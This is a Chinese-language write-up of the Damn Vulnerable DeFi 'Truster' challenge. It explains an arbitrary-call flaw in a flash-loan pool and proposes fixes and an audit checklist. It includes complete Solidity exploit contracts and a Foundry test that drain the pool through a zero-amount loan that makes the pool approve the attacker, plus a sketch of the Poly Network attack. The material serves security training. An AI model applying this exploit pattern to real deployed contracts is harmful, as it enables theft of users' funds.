# Truster 漏洞分析

## 1. 合约功能概述

`TrusterLenderPool` 是一个提供免费闪电贷的简单池子，允许用户借出 DVT 代币。

**核心组件：**
- **TrusterLenderPool.sol**: 闪电贷池合约，提供灵活的闪电贷功能

**业务流程：**
1. 池子持有 1,000,000 DVT 代币
2. 用户可以调用 `flashLoan()` 借出任意数量代币
3. 闪电贷支持在借款期间执行任意合约调用
4. 归还后余额不能低于借款前

---

## 2. 漏洞位置

### 漏洞代码（TrusterLenderPool.sol#L20-L34）

```solidity
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);
    // ⚠️ 漏洞核心：以 pool 的身份调用任意合约的任意函数
    target.functionCall(data);

    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }

    return true;
}
```

**functionCall 的定义（OpenZeppelin Address 库）：**
```solidity
function functionCall(address target, bytes memory data) internal returns (bytes memory) {
    return functionCallWithValue(target, data, 0);
}

function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
    // 实际上就是 target.call{value: value}(data)
    (bool success, bytes memory returndata) = target.call{value: value}(data);
    return verifyCallResultFromTarget(target, success, returndata);
}
```

---

## 3. 漏洞原理分析

### 3.1 过度灵活的函数设计

**问题核心：** `flashLoan()` 允许调用者指定任意 `target` 和 `data`，池子会以自己的身份执行该调用。

**预期用法（开发者可能的想法）：**
```
调用者指定 target = 自己的合约
→ pool 调用 borrower_contract.executeFlashLoan()
→ borrower 合约执行业务逻辑
→ borrower 合约归还贷款 ✅
```

**实际风险：**
```
调用者可以指定 target = 任何合约（包括 token 本身）
→ pool 以自己的身份调用 token.approve(attacker, ∞)
→ 攻击者获得 pool 的代币授权 ❌
```

### 3.2 授权攻击（Approval Attack）

**正常的 ERC20 approve 流程：**
```solidity
// Alice 授权 Bob 花费自己的代币
alice.call(token.approve(bob, amount))
→ token.allowance(alice, bob) = amount
→ bob 可以 transferFrom(alice, receiver, amount)
```

**攻击利用：**
```solidity
// 攻击者让 pool 授权自己
attacker.call(pool.flashLoan(0, attacker, token, approve_data))
→ pool.call(token.approve(attacker, huge_amount))
→ token.allowance(pool, attacker) = huge_amount ✅
→ attacker.call(token.transferFrom(pool, recovery, all_tokens)) ✅
```

### 3.3 绕过余额检查

**余额检查逻辑：**
```solidity
uint256 balanceBefore = token.balanceOf(address(this));
// ... 借出 amount 代币
// ... 执行任意调用
if (token.balanceOf(address(this)) < balanceBefore) {
    revert RepayFailed();
}
```

**攻击绕过：**
```
1. amount = 0 → pool 不转出任何代币
2. pool 执行 approve(attacker, ∞) → 余额不变
3. 余额检查: balanceAfter (1,000,000) >= balanceBefore (1,000,000) ✅
4. 闪电贷成功返回
5. 攻击者在外部调用 transferFrom 提取所有代币 ✅
```

### 3.4 为什么会有这个漏洞

**根本原因：**
1. **信任外部输入**: 允许调用者控制执行流程（target + data）
2. **混淆权限上下文**: 池子以自己的身份执行用户提供的代码
3. **不完整的状态验证**: 只检查余额，不检查授权状态
4. **功能过度设计**: 闪电贷不需要"任意调用"功能

**设计缺陷：**
- 标准闪电贷（如 EIP-3156）使用回调模式：`borrower.onFlashLoan()`
- TrusterLenderPool 允许调用任意 target，打破了"借款人控制"的假设
- `target.functionCall(data)` 等价于给用户一个 `delegatecall` 权限（虽然用的是 call）

---

## 4. 修复方案

### 方案一：使用标准回调模式（推荐）

```solidity
interface IFlashLoanReceiver {
    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata params
    ) external returns (bool);
}

function flashLoan(uint256 amount, address borrower, bytes calldata params)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);
    
    // ✅ 固定调用借款人的特定函数
    require(
        IFlashLoanReceiver(borrower).executeOperation(
            address(token),
            amount,
            0,
            params
        ),
        "Callback failed"
    );

    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }

    return true;
}
```

**为什么有效：**
- 只调用 `borrower` 合约的固定函数，不调用任意 target
- 借款人无法让 pool 执行 token.approve()
- 符合 EIP-3156 标准，安全可预测

### 方案二：移除 target 参数

```solidity
function flashLoan(uint256 amount, address borrower, bytes calldata data)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);
    
    // ✅ 只调用 borrower，不允许指定 target
    borrower.functionCall(data);

    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }

    return true;
}
```

**为什么有效：**
- `target` 固定为 `borrower`，池子不会调用外部合约
- 即使调用 `borrower.approve(attacker, amount)`，授权的是 borrower 的代币，而非 pool 的

### 方案三：检查敏感状态变化

```solidity
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));
    uint256 allowanceBefore = token.allowance(address(this), borrower);

    token.transfer(borrower, amount);
    target.functionCall(data);

    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }
    
    // ✅ 检查授权没有增加
    if (token.allowance(address(this), borrower) > allowanceBefore) {
        revert UnauthorizedApproval();
    }

    return true;
}
```

**权衡：**
- ✅ 防止授权攻击
- ❌ 增加 gas 成本
- ❌ 无法完全枚举所有敏感状态（nonces, operators 等）
- ❌ 仍存在调用其他合约的未知风险

### 方案四：白名单机制

```solidity
mapping(address => bool) public allowedTargets;

function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    nonReentrant
    returns (bool)
{
    // ✅ 只允许调用白名单合约
    require(allowedTargets[target], "Target not allowed");
    require(target != address(token), "Cannot call token contract");
    
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);
    target.functionCall(data);

    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }

    return true;
}
```

**权衡：**
- ✅ 限制攻击面
- ❌ 需要维护白名单，降低灵活性
- ❌ 仍需小心审计白名单合约

---

## 5. Proof of Concept

### 攻击代码（单交易完成）

```solidity
contract Attacker {
    TrusterLenderPool public pool;
    DamnValuableToken public token;
    address public recovery;

    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) {
        pool = _pool;
        token = _token;
        recovery = _recovery;
    }

    function attack() external {
        uint256 poolBalance = token.balanceOf(address(pool));
        
        // 步骤1: 构造 approve calldata
        bytes memory approveCalldata = abi.encodeWithSelector(
            IERC20.approve.selector,
            address(this),      // spender = 攻击合约
            poolBalance         // amount = 池子的全部余额
        );

        // 步骤2: 调用 flashLoan，让 pool 授权自己
        //   - amount = 0 (不借出代币，避免余额变化)
        //   - borrower = address(this) (形式参数，实际不重要)
        //   - target = address(token) (调用目标 = DVT 代币合约)
        //   - data = approve_calldata (授权数据)
        pool.flashLoan(0, address(this), address(token), approveCalldata);
        
        // 步骤3: 使用授权提取所有代币到 recovery
        token.transferFrom(address(pool), recovery, poolBalance);
    }
}
```

### 攻击流程详解

```
初始状态:
├─ Pool: 1,000,000 DVT
├─ Player: 0 DVT
└─ Recovery: 0 DVT

执行 attacker.attack():
│
├─ [1] 构造 approveCalldata
│      data = keccak256("approve(address,uint256)")[:4] 
│             + pad(attacker_address) 
│             + pad(1000000e18)
│
├─ [2] pool.flashLoan(0, attacker, token_address, approveCalldata)
│   │
│   ├─ balanceBefore = 1,000,000 DVT
│   │
│   ├─ token.transfer(attacker, 0) → 转账 0（无影响）
│   │
│   ├─ token.functionCall(approveCalldata)
│   │   └─ 实际执行: token.approve(attacker, 1000000e18)
│   │       → msg.sender = pool ✅
│   │       → allowance[pool][attacker] = 1,000,000 DVT ✅
│   │
│   └─ balanceAfter = 1,000,000 DVT
│       → 1,000,000 >= 1,000,000 ✅ 检查通过
│
└─ [3] token.transferFrom(pool, recovery, 1000000e18)
    │   → allowance[pool][attacker] = 1,000,000 DVT ✅ 有授权
    │   → 转账成功
    │
最终状态:
├─ Pool: 0 DVT
├─ Player: 0 DVT
└─ Recovery: 1,000,000 DVT ✅
```

### 关键技术点

1. **零借款绕过余额检查**
```solidity
// 借 0 代币 → 余额不变 → 余额检查必然通过
pool.flashLoan(0, ...)  
```

2. **池子以自己身份执行授权**
```solidity
// pool 作为 msg.sender 调用 token.approve()
target.functionCall(data)  
// 等价于: token.approve(attacker, amount) 的调用者是 pool
```

3. **外部提取授权的代币**
```solidity
// 闪电贷函数返回后，授权仍然生效
token.transferFrom(pool, recovery, amount)
```

### 单交易约束

**测试要求：**
```solidity
assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
```

**实现方式：**
```solidity
function test_truster() public checkSolvedByPlayer() {
    // Player 的唯一交易：部署攻击合约（构造函数中执行攻击）
    new Attacker(pool, token, recovery);
    // 或者：部署后调用 attack()
    Attacker attacker = new Attacker(pool, token, recovery);
    attacker.attack();  // 这会占用 2 个 nonce
}
```

**优化：在构造函数中攻击**
```solidity
contract Attacker {
    constructor(TrusterLenderPool pool, DamnValuableToken token, address recovery) {
        uint256 amount = token.balanceOf(address(pool));
        
        bytes memory data = abi.encodeWithSelector(
            IERC20.approve.selector,
            address(this),
            amount
        );
        
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), recovery, amount);
    }
}

// Player 只需一个交易
function test_truster() public checkSolvedByPlayer() {
    new Attacker(pool, token, recovery);  // nonce = 1 ✅
}
```

---

## 6. 关键要点总结

| 维度 | 说明 |
|------|------|
| **攻击成本** | 单笔交易，无需初始资金 |
| **攻击影响** | 完全掏空池子（1,000,000 DVT）|
| **漏洞类型** | 任意外部调用（Arbitrary External Call）|
| **根本原因** | 信任用户提供的执行流程（target + data）|
| **修复难度** | 低，使用标准回调模式 |
| **安全启示** | 永远不要以合约自己的身份执行用户提供的任意调用 |

---

## 7. 扩展思考

### 类似漏洞模式

1. **Arbitrary Call Vulnerability**: 允许调用任意合约的任意函数
2. **Approval Front-running**: 利用授权窃取资金
3. **Delegatecall to User-Controlled Target**: delegatecall 到用户控制的地址
4. **Callback Manipulation**: 回调机制中的权限混淆

### 真实案例参考

**类似攻击案例：**
- **Poly Network (2021)**: 跨链桥允许执行任意 call，攻击者修改 keeper 地址窃取 6.1 亿美元
- **Nomad Bridge (2022)**: 消息验证漏洞，允许任意消息执行
- **Euler Finance (2023)**: Donation attack，但也涉及复杂的调用链操作

**Poly Network 攻击简化版：**
```solidity
// 伪代码
contract Bridge {
    address public keeper;
    
    function executeMessage(address target, bytes memory data) external {
        require(verifySignature(...));  // 验证绕过
        
        // 漏洞：以 bridge 身份执行任意调用
        target.call(data);  
    }
}

// 攻击者调用
bridge.executeMessage(
    address(bridge),
    abi.encodeWithSignature("setKeeper(address)", attacker)
);
// → bridge.setKeeper(attacker)
// → 攻击者成为 keeper，控制跨链资金
```

### 防御最佳实践

```solidity
✅ DO: 使用固定的回调接口（如 EIP-3156）
✅ DO: 只调用 borrower 合约，不调用任意 target
✅ DO: 使用 try-catch 处理回调失败
✅ DO: 最小化闪电贷期间的权限
❌ DON'T: 允许用户控制 call/delegatecall 的目标地址
❌ DON'T: 在特权上下文中执行用户提供的 calldata
❌ DON'T: 假设"余额检查"能覆盖所有安全问题
❌ DON'T: 忽视授权（approval）、operator 等隐藏状态
```

### 安全的闪电贷实现对比

| 特性 | TrusterLenderPool (漏洞版) | EIP-3156 标准 |
|------|---------------------------|---------------|
| 调用目标 | 用户指定的任意 target | 固定为 borrower |
| 调用函数 | 用户指定的任意 data | `onFlashLoan()` |
| 权限上下文 | Pool 的身份 | Borrower 的身份 |
| 安全性 | ❌ 极度危险 | ✅ 安全可控 |

### EIP-3156 标准实现示例

```solidity
// IERC3156FlashLender
interface IERC3156FlashBorrower {
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32);
}

contract SecureFlashLender {
    bytes32 private constant CALLBACK_SUCCESS = 
        keccak256("ERC3156FlashBorrower.onFlashLoan");
    
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
        uint256 balanceBefore = IERC20(token).balanceOf(address(this));
        
        // 转出代币
        IERC20(token).transfer(address(receiver), amount);
        
        // ✅ 只调用 receiver 的固定回调函数
        require(
            receiver.onFlashLoan(msg.sender, token, amount, 0, data) == CALLBACK_SUCCESS,
            "Callback failed"
        );
        
        // 检查归还
        uint256 balanceAfter = IERC20(token).balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Repay failed");
        
        return true;
    }
}
```

---

## 8. 代码审计检查清单

在审计闪电贷或类似功能时，检查以下要点：

### 任意调用检查
- [ ] 是否允许用户指定 `target` 地址？
- [ ] 是否允许用户提供任意 `calldata`？
- [ ] 调用是 `call` 还是 `delegatecall`？（delegatecall 更危险）
- [ ] 调用的执行者是谁？（Pool？User？）

### 状态保护检查
- [ ] 是否检查了余额前后变化？
- [ ] 是否检查了授权（allowance）变化？
- [ ] 是否检查了其他敏感状态（nonces, operators 等）？
- [ ] 检查是否对所有相关代币/NFT 都生效？

### 回调安全检查
- [ ] 回调是否使用固定接口？
- [ ] 回调目标是否可信？
- [ ] 是否防御了重入攻击？
- [ ] 回调失败时是否正确处理？

### 权限隔离检查
- [ ] 特权操作是否在用户可控的调用中？
- [ ] 是否混淆了不同角色的权限上下文？
- [ ] 是否有操作可以修改关键配置？

---

## 附录：完整测试代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TrusterExploitTest is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    function setUp() public {
        vm.startPrank(deployer);
        
        token = new DamnValuableToken();
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);
        
        vm.stopPrank();
    }

    function testExploit() public {
        vm.startPrank(player);
        
        // 方法1: 单独部署和调用（2个交易）
        // Attacker attacker = new Attacker(pool, token, recovery);
        // attacker.attack();
        
        // 方法2: 构造函数中攻击（1个交易）✅
        new AttackerInConstructor(pool, token, recovery);
        
        vm.stopPrank();
        
        // 验证
        assertEq(token.balanceOf(address(pool)), 0);
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL);
        assertEq(vm.getNonce(player), 1);
        
        console.log("[+] Exploit successful!");
        console.log("    Pool balance:", token.balanceOf(address(pool)));
        console.log("    Recovery balance:", token.balanceOf(recovery));
    }
}

// 方法1: 外部调用攻击函数
contract Attacker {
    TrusterLenderPool public pool;
    DamnValuableToken public token;
    address public recovery;

    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) {
        pool = _pool;
        token = _token;
        recovery = _recovery;
    }

    function attack() external {
        uint256 amount = token.balanceOf(address(pool));
        
        bytes memory approveData = abi.encodeWithSelector(
            IERC20.approve.selector,
            address(this),
            amount
        );

        pool.flashLoan(0, address(this), address(token), approveData);
        token.transferFrom(address(pool), recovery, amount);
    }
}

// 方法2: 构造函数中完成攻击（节省1个nonce）
contract AttackerInConstructor {
    constructor(TrusterLenderPool pool, DamnValuableToken token, address recovery) {
        uint256 amount = token.balanceOf(address(pool));
        
        bytes memory approveData = abi.encodeWithSelector(
            IERC20.approve.selector,
            address(this),
            amount
        );

        pool.flashLoan(0, address(this), address(token), approveData);
        token.transferFrom(address(pool), recovery, amount);
    }
}
```

**运行测试：**
```bash
forge test --match-test testExploit -vvvv
```

**输出示例：**
```
[PASS] testExploit() (gas: 123456)
Logs:
  [+] Exploit successful!
      Pool balance: 0
      Recovery balance: 1000000000000000000000000
```

---

## 总结

Truster 展示了最经典的"任意外部调用"漏洞：

**核心问题：** 合约以自己的身份执行用户提供的任意调用

**攻击技巧：**
1. 零借款绕过余额检查
2. 让 Pool 授权攻击者
3. 外部提取授权的代币

**防御要点：**
- 使用标准回调接口（EIP-3156）
- 不允许用户控制 `target` 和 `data`
- 检查所有敏感状态变化，不仅是余额

这个漏洞虽然简单，但在真实世界中造成了数亿美元的损失（如 Poly Network）。它提醒我们：**永远不要信任用户提供的执行流程。**
